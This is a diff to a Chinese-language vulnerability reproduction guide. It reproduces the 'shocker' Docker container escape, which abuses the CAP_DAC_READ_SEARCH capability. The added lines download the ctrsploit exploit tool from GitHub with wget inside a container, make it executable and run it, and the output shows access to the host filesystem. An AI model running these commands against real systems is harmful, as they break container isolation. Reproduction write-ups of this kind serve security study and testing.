@@ -98,19 +98,14 @@ Linux localhost.localdomain 6.8.0-64-generic #67-Ubuntu SMP PREEMPT_DYNAMIC Sun 
 
 ### 5.2 漏洞复现
 
-启动存在不安全配置的容器。
-
-```
+```shell
 root@localhost:~# docker run -ti --name poc --cap-add CAP_DAC_READ_SEARCH busybox:latest
-```
-
-下载 ctrsploit 步骤略，在容器内发起逃逸攻击。
-
-```
+root@e33b98bef3c3:/# wget https://github.com/ctrsploit/ctrsploit/releases/latest/download/ctrsploit_linux_amd64 -O /usr/bin/ctrsploit
+root@e33b98bef3c3:/# chmod +x /usr/bin/ctrsploit
 root@e33b98bef3c3:/# ctrsploit --colorful checksec shocker
 ✔  shocker      # Container escape with CAP_DAC_READ_SEARCH, alias shocker, found by Sebastian Krahmer (stealth) in 2014.
 
-root@e33b98bef3c3:/# ./ctrsploit/bin/release/ctrsploit_linux_amd64 exploit shocker
+root@e33b98bef3c3:/# ctrsploit exploit shocker
 root@8fe1576e6aef:/proc/self/fd/7# ls -lah
 ls: cannot access '..': No such file or directory
 total 18M
